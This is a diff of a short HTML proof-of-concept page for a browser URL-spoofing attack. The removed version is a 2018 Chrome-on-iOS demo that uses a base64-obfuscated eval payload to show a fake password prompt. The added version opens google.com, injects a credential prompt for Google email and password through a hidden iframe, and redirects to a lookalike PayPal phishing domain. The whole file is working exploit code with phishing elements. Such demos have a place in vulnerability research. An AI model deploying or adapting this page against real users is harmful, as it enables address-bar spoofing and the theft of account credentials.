@@ -1,24 +1,26 @@
 <html>
-	<head>
-	    <title>Chrome URL spoofing vulnerability on IOS</title>
-	    <!--
-	        author: evi1m0.bat[at]gmail.com
-	        datetime: 2018/05/03 00:16:27
-	        test version: for iPhone 66.0.3359.122
-	    -->
-	</head>
-	<script>
-	    pwn = () => {
-	        x = open('', 'win');
-			x.document.write('<input type="button" value="HEllo world this is spoof URL" onclick=document.location="http://www.facebook.com" />')
-	        setTimeout(`
-	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><h2>Chrome URL spoofing vulnerability on IOS</h2>');
-	            `, 1000);
-	        setTimeout(`
-	            `, 2300);
-	    }
-	</script>
-	<h1>
-	    <a onclick="pwn()">ClickMe :-)</a>
-	</h1>
-	</html>
+  <body>
+
+    <script>
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+
+    }
+    
+    </script>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
